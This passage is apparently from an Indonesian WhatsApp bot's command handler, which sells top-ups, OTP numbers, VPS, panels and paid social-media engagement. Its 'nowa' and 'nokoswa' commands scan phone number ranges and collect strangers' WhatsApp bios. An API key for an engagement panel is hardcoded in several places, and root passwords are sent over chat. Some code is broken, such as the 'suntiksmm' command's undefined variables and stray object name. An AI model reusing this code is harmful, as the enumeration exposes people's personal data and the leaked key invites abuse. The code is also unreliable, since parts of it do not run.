    let sign = sha1(api_id + api_key)
    let axios = require('axios')
        axios('https://maupedia.com/api/game-feature',{method: 'POST',data: new URLSearchParams(Object.entries({key: api_key,secret: secret,sign: sign,type: 'order',service: kode,data_no: id,data_zone: zone}))}).then((res) => {
          if (res.data.result == false) {
            reply(`*_${res.data.message}_*`)
          }
          if (res.data.result == true) {
            anjay = `*── 「 TOPUP BERHASIL 」 ──*\n\n*_Trx id : ${res.data.data.trxid}_*\n*_Id/zone: ${res.data.data.data}(${res.data.data.zone})_*\n*_Layanan : ${res.data.data.service}_*\n*_Status : ${res.data.data.status}_*\n*_Harga : ${res.data.data.price}_*\n*_Saldo : ${res.data.data.balance}_*\n\n*_Note:Untuk melakukan cek status topup silahkan ketik ${prefix}cekstatus No trx id_*`
            Biiofc.sendMessage(from, { text: anjay }, { quoted:m})
          }
      })
    }
break
case "list-sosmed": {
  if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  let fetch = require('node-fetch');
  let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
  let requestData = new URLSearchParams();
  requestData.append('key', api_key);
  requestData.append('sign', sign);
  requestData.append('secret', secret);
  requestData.append('type', 'services');
  requestData.append('filter_type', 'category');
  requestData.append('filter_value', text);
  let response = await fetch('https://maupedia.com/api/social-media', {
    method: 'POST',
    body: requestData
  });
  let data = await response.json();
  if (!args[0]) {
    let gameList = [...new Set(data.data.map(item => item.category))].join('\n');
    let message = `Gunakan .game nama gamenya untuk melihat list layanan.\nBerikut list game yang tersedia:\n\n${gameList}`;
    return reply(message);
  } else {
    let serviceList = data.data;
    if (serviceList.length > 0) {
      let message = '*_----- Price List Sosmed-----_*\n';
      for (let service of serviceList) {
        let price = service.price;
        let status = service.status;
       let priceList = `_Rp${price.basic}_`;
        message += `\n_✨ Layanan: ${service.category}_\n_✨ Id: ${service.id}_\n_✨ Produk: ${service.name}_\n✨ Harga:${priceList}\n*_✨ Status: ${status}_*\n`;
      }
      return reply(message);
    } else {
      return reply('Tidak ada layanan yang tersedia untuk game tersebut.');
    }
  }
        }
break
case "cekgame" : {
  if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        let [game, id, zone] = q.split(" ")
        let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
    let axios = require('axios')
        axios('https://maupedia.com/api/game-validation',{method: 'POST',data: new URLSearchParams(Object.entries({key: api_key,secret: secret,sign: sign,game: game,id: id,zone: zone}))}).then((res) => {
          if (res.data.result == false) {
            reply(`*_${res.data.message}_*`)
          }
          if (res.data.result == true) {
            anjay = `*── 「 NICKNAME ${game} 」 ──*\n\n*_》 Id: ${res.data.data.id}_*\n*_》 zone : ${res.data.data.zone}_*\n*_》 Name : ${res.data.data.name}_*\n\n*_Note:Untuk melakukan cek id game silahkan ketik ${prefix}list-game id/zone_*`
            Biiofc.sendMessage(from, { text: anjay }, { quoted:m})
          }
      })
        }
break
case "list-pascabayar": {
  if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  let fetch = require('node-fetch');
  let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
  let requestData = new URLSearchParams();
  requestData.append('key', api_key);
  requestData.append('sign', sign);
  requestData.append('secret', secret);
  requestData.append('type', 'services');
  requestData.append('filter_type', 'brand');
  requestData.append('filter_value', text);
  let response = await fetch('https://maupedia.com/api/postpaid', {
    method: 'POST',
    body: requestData
  });
  let data = await response.json();
  if (!args[0]) {
    let gameList = [...new Set(data.data.map(item => item.brand))].join('\n');
    let message = `Gunakan .list nama gamenya untuk melihat list layanan.\nBerikut list emoney yang tersedia:\n\n${gameList}`;
    return reply(message);
  } else {
    let serviceList = data.data;
    if (serviceList.length > 0) {
      let message = '*_----- Price List Prabayar-----_*\n';
      for (let service of serviceList) {
        let price = service.price;
        let status = service.status;
       let priceList = `_Rp${price.basic}_`;
        message += `\n_✨ Layanan: ${service.brand}_\n_,✨ kode Produk: ${service.code}_\n_✨ Produk: ${service.name}_\n✨ Harga:${priceList}\n*_✨ Status: ${status}_*\n`;
      }
      return reply(message);
    } else {
      return reply('Tidak ada layanan yang tersedia untuk game tersebut.');
    }
  }
        }
break
case "list-prabayar": {
  if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  let fetch = require('node-fetch');
  let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
  let requestData = new URLSearchParams();
  requestData.append('key', api_key);
  requestData.append('sign', sign);
  requestData.append('secret', secret);
  requestData.append('type', 'services');
  requestData.append('filter_type', 'brand');
  requestData.append('filter_value', text);
  let response = await fetch('https://maupedia.com/api/prepaid', {
    method: 'POST',
    body: requestData
  });
  let data = await response.json();
  if (!args[0]) {
    let gameList = [...new Set(data.data.map(item => item.brand))].join('\n');
    let message = `Gunakan .list nama gamenya untuk melihat list layanan.\nBerikut list emoney yang tersedia:\n\n${gameList}`;
    return reply(message);
  } else {
    let serviceList = data.data;
    if (serviceList.length > 0) {
      let message = '*_----- Price List Prabayar-----_*\n';
      for (let service of serviceList) {
        let price = service.price;
        let status = service.status;
       let priceList = `_Rp${price.basic}_`;
        message += `\n_✨ Layanan: ${service.brand}_\n_,✨ kode Produk: ${service.code}_\n_✨ Produk: ${service.name}_\n✨ Harga:${priceList}\n*_✨ Status: ${status}_*\n`;
      }
      return reply(message);
    } else {
      return reply('Tidak ada layanan yang tersedia untuk game tersebut.');
    }
  }
        }
break
case "topup" : case "paket" :{
        if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
        let [nomer, kode] = q.split(" ")
        let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
    let axios = require('axios')
        axios('https://maupedia.com/api/game-feature',{method: 'POST',data: new URLSearchParams(Object.entries({key: api_key,secret: secret,sign: sign,type: 'order',service: kode,data_no: nomer}))}).then((res) => {
          if (res.data.result == false) {
            reply(`*_${res.data.message}_*`)
          }
          if (res.data.result == true) {
            anjay = `*── 「 TOPUP BERHASIL 」 ──*\n\n*_》 Trx id : ${res.data.data.trxid}_*\n*_》 Nomer: ${res.data.data.data}_*\n*_》 Kode : ${res.data.data.code}_*\n*_》 Topup : ${res.data.data.service}_*\n*_》 status : ${res.data.data.status}_*\n*_》 Informasi : ${res.data.data.note}_*\n*_》 Jumblah : ${res.data.data.balance}_*\n*_》 Price : ${res.data.data.price}_*\n\n*_Untuk melakukan cek status topup silahkan ketik ${prefix}cekstatus No trx id_*`
            Biiofc.sendMessage(from, { text: anjay }, { quoted:m})
          }
      })
        }
break
case "maudeposit" : {
        if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
        let [method, quantity, sender] = q.split(" ")
        let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
    let axios = require('axios')
        axios('https://maupedia.com/api/deposit',{method: 'POST',data: new URLSearchParams(Object.entries({key: api_key,secret: secret,sign: sign,type: 'request',method: method,quantity: quantity,sender: sender}))}).then((res) => {
          if (res.data.result == false) {
            reply(`*_${res.data.message}_*`)
          }
          if (res.data.result == true) {
            anjay = `*── 「 DEPOSIT 」 ──*\n\n*_》 Trx id : ${res.data.data.trxid}_*\n*_》 METODE: ${res.data.data.method}(${res.data.data.name})_*\n*_Harga : ${res.data.data.sender}_*\n*_》 Jumlah : ${res.data.data.amount}_*\n*_》 Kode Uniq : ${res.data.data.uniq}_*\n*_》 Fee : ${res.data.data.fee}_*\n*_》 Mendapatkan Jumblah : ${res.data.data.get_amount}_*\n*_》 Jumlah Pembayaran : ${res.data.data.pay_amount}_*\n\n*_Note:Untuk melakukan cek status topup silahkan ketik ${prefix}cekstatus No trx id_*`
            Biiofc.sendMessage(from, { text: anjay }, { quoted:m})
          }
      })
        }
break
case "sms":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!q) return reply(`id yah mana?`)
var res = await fetchJson(`${global.domainotp}/set-orders/${apikeyotp}/${q}`)
if (res.success == false) return reply(res.data.messages)
await sleep(1000)
let ress = res.data.data
reply(`*── 「 DETAIL RIWAYAT 」 ──*

_》 order id: ${ress.order_id}_
_》 aplikasi id: ${ress.aplikasi_id}_
_》 number: ${ress.number}_
_》 status: ${ress.status}_
_》 created at: ${ress.created_at}_
_》 apk name: ${ress.aplikasi_name}_`)
}
break

case "listsewa" : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
reply(`Hai kak👋

*_LIST SEWA BOT DE4YOU OFFCIAL PAYMENT_*

○ 1 DAY : 5k
○ 3 DAY : 15k
○ 5 DAY : 25k
○ 7 DAY : 45k
○ 10 DAY : 55k
○ 14 DAY : 65k
○ 21 DAY : 75k
○ 30 DAY : 85k
○ PERMANEN : ( Pm Owner )

CARA ORDER
.sewa linkgc|1day`)
}
break
case "order":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
if (!q) return reply(teks_format)
var res = await fetchJson(`${global.domainotp}/set-orders/${apikeyotp}/${q}`)
if (res.success == false) return reply(res.data.messages)
reply(res.data.message)
await sleep(1000)
let ress = res.data.data
reply(`*Berikut Detail Orderan Anda*

- order_id: ${ress.order_id}
- aplikasi_id: ${ress.aplikasi_id}
- number: ${ress.number}
- status: ${ress.status}
- sms: ${ress.sms}
- status_sms: ${ress.status_sms}
- price: Rp${ress.price}
- last_saldo: Rp${toRupiah(ress.last_saldo)}
- created_at: ${ress.created_at}
- last_sms: ${ress.last_sms}
- aplikasi_name: ${ress.aplikasi_name}

• info selengkapnya
silahkan ketik .getorder`)
}
break
case "getorder":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
if (!q) return reply(teks_format2)
var res = await fetchJson(`${global.domainotp}/set-orders/${apikeyotp}/${q}`)
if (res.success == false) return reply(res.data.messages)
reply(res.data.message)
await sleep(1000)
let ress = res.data.data
reply(`*Berikut Detail Orderan Anda*

- order_id: ${ress.order_id}
- aplikasi_id: ${ress.aplikasi_id}
- number: ${ress.number}
- status: ${ress.status}
- sms: ${ress.sms}
- status_sms: ${ress.status_sms}
- price: Rp${ress.price}
- last_saldo: Rp${toRupiah(ress.last_saldo)}
- created_at: ${ress.created_at}
- last_sms: ${ress.last_sms}
- aplikasi_name: ${ress.aplikasi_name}`)
}
break
case "ceksaldo-smm": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        let md5 = require('md5')
        let apikey_smm = "JrMVEQTPU0gKXRVe1fB1T3zfM"
        let fetch = (...args) => import('node-fetch').then(({
          default: fetch
        }) => fetch(...args))
        let data = {
          api_key: apikey_smm,
        }
        fetch(`https://mrxpanel.com/api/profile`, {
            method: 'POST',
            body: JSON.stringify(data),
            headers: {
              'Content-Type': 'application/json'
            }
          })
          .then(response => response.json())
          .then((data) => {
            anjir = `*── 「 SISA SALDO 」 ──*\n\n*_Saldo : ${data.data.balance}_*\n*_Full name : ${data.data.full_name}_*\n*_username : ${data.data.username}_*`
           Biiofc.sendMessage(from, { text: anjir }, { quoted:m})
          })
}
break;    
case "suntiksmm": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        if (!text) return reply(`example .suntiksmm 25 https://youtube.com/shorts/z4tojQ3PmWY?feature=shared 100000`)
     let fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 let apismm = "JrMVEQTPU0gKXRVe1fB1T3zfM"
        let data = {
          api_key: apikeysmm,
          service: jumlah,
          target: targ,
          quantity: idny,
        }
        fetch('https://mrxpanel.com/api/order', {
            method: 'POST',
            body: JSON.stringify(data),
            header: {
              'Content-Type': 'application/json'
            }
          }).then((response) => response.json())
          .then((res) => {
                if (res.data.message == 'Saldo Anda tidak cukup untuk melakukan pemesanan ini.') { 
            reply(res.data.message)
            }
                    if (res.data.message == 'Pesanan berhasil, pesanan akan diproses.') {
      cap = `*──••• 「 TRANSAKSI BERHASIL 」 •••──*

ID : ${res.data.id}

*_untuk cek transaksi silahkan ketik = .cektransaksi id_*`
         rizalxdzz.sendMessage(from, { caption: cap })
}
          
}
)}
break
case "cektransaksi":
case "cektrx": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
	if (!isOwner) throw ('Khusus Owner')
    if (!text) {
        let errorMessage = '⚠️ *Format salah!*\n\nContoh :\n_cektrx 11012_*';

        return   Biiofc.sendMessage(msg.chat, {text:errorMessage})
    }
    let [refid] = text.split(" ");
    let md5 = require('md5');
    let fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
    let apikeysmm = "JrMVEQTPU0gKXRVe1fB1T3zfM"
    let data = {
          api_key: apikeysmm,
          id: refid,
    };
    let response = await fetch('https://mrxpanel.com/api/status', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    });
    let result = await response.json();
if (result.status == false) {
  reply(`\n\nPermasalahan :\n${result.data.message} `)
} else {
	let successMessage = `*──••• 「 STATUS TRANSAKSI 」 •••──*

_🆔Tujuan: ${result.data.target}_
_✨ Hrga : ${result.data.price}_
_🧾 Waktu : ${result.data.start_count}_
_📝 Jumblah  : ${result.data.remains}_
_🔢 Status_ : ${result.data.status}
`;

       Biiofc.sendMessage(msg.chat, {text:successMessage})
}
}
break
case 'smmlist':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        let md5 = require('md5')
        let smmkey = "JrMVEQTPU0gKXRVe1fB1T3zfM"
        let data = {
          api_key: smmkey,        }
        fetch(`https://mrxpanel.com/api/services`, {
            method: 'POST',
            body: JSON.stringify(data),
            headers: {
              'Content-Type': 'application/json'
            }
          })
          .then(response => response.json())
          .then((data) => {
var teks = '*List Layanan*\n\n'
let GG = 0
for (let x of data.data){
teks +=`🆔 id: ${x.id}\n🧨Nama : ${x.name}\n🛒 Kategori : ${x.category}\n💸Price : Rp${x.price}\n📔Deks : ${x.description}\n🦕Type : ${x.type}\n🎈Min Order : ${x.min}\n🌼Max Order : ${x.max}\n Stok : ${x.status}\n\n`
}
reply(teks)
})
}
break
case "deposit-smm":
case "smm": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
	if (!isOwner) throw ('Minimal deposit Rp200000')
      let apikeysmm = "JrMVEQTPU0gKXRVe1fB1T3zfM"
    let md5 = require('md5');
    let fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));;
    let data = {
        api_key: apikeysmm,
    };
    let response = await fetch('https://mrxpanel.com/api/services', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    });
    let result = await response.json();
	      if (result.status == false) {
  reply(`*Maaf orderan gagal di buat*\n\nPermasalahan :\n${result.data.message} atau Cara order anda salah\n\nDiharapkan sudah faham jika ingin membeli\njika masih tidak faham silahkan ketik ${prefix}owner!\n`)
} else {
	let successMessage = `LIST

📝 ID : _${result.data.id}_

*_UNTUK MELIHAT TRX ID SILHAKAN KETIK trx!!._*`;

   Biiofc.sendMessage(m.chat, {text:successMessage})
}}
break
case 'sendbyr': case 'sendhutang': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
Biiofc.sendMessage(piw, { image: { url: 'https://telegra.ph/file/b2eeca3b2437585e5668e.jpg' },  caption: `━━━[ PAYMENT DE4YOU OFFCIAL ]━━━

NO DANA 1 : 083857201529

NO GOPAY 1 : -

QRIS ALLPAY : SCAN 

*_Jangan Lupa Kirim Bukti Pembayaran Ke_*
*DE4YOU Offcial*
` }, { quoted: fkontak })
}
break
case 'svps': case 'sendvps': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		 if (!isOwner) return (`Ngapain? Khusus Owner!!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,ip,ram,harga,passwordvps`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
Biiofc.sendMessage(mq1, {text:`*───❖》DE4YOU Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m4}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Ip : ${m2}*\n*[+] Username : root*\n*[+] Password : ${m5}*\n*[+] Ram : ${m3}*\n\n*───《TOS VPS》───*\n\n*-JANGAN SAMPAI TERKENA DDOS*\n*-JANGAN GUNAKAN UNTUK DDOS*\n*-JANGAN GUNAKAN UNTUK MINING*\n*-CPU JANGAN SAMPAI 100%*\n*-JANGAN DIPAKAI UNTUK TUNELING*\n*-MELANGGAR RULES? GARANSI ANGUS*\n*-PANEL SUS NO REFF*\n\n\n\n*© De4you Offcial*`}, m) 
}
break
 case 'sdomain': case 'sendomain': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		 if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,harga,domain`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
Biiofc.sendMessage(mq1, {text:`*───❖》De4you Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Domain : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Tutup ( Sensor ) Domain Anda Dan Jangan Sampai Orang Lain Melihat Atau Tidak Nanti Domain Anda Bakal Kena Ddos Attack_*\n\n\n\n*© De4you Offcial*`}, m) 
                 }
            break
 case 'spanel': case 'sendpanel': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		 if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,harga,linklog,username, password`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya =  + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
Biiofc.sendMessage(mq1, {text:`*───❖》De4you Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : ${m4}*\n*[+] Password : ${m5}*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n\n\n\n*© De4you Offcial*`}, m) 
                 }
            break
        case 'nowa': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, domain ini hanya untuk pemilik.')
if (!args[0]) return reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return reply('Salah Tuan Bukan Begitu Xixi')
reply('Wait Tuan Sedang Kami Proses⏳')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await Biiofc.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await Biiofc.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
case 'wanumber': case 'neednokos': case 'nokoswa':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, domain ini hanya untuk pemilik.')
if (!text) return reply(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await Biiofc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await Biiofc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break
   case 'leave': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
                await Biiofc.groupLeave(m.chat)
                await reply(`Done Tuan✅`)
            }
            break
case 'setbotname':{
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!text) return reply(`Dimana Namanya Tuan?\nExample: ${prefix + command} DE4YOU Offcial`)
    await Biiofc.updateProfileName(text)
    reply(`Berhasil Mengubah Nama Bot Tuan✅`)
    }
    break
case 'setbotbio':{
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!text) return reply(`Dimana Textnya Tuan?\nExample: ${prefix + command} DE4YOU Offcial`)
    await Biiofc.updateProfileStatus(text)
    reply(`Berhasil Mengubah Bio Nomor Bot Tuan✅`)
    }
    break
case "public": {
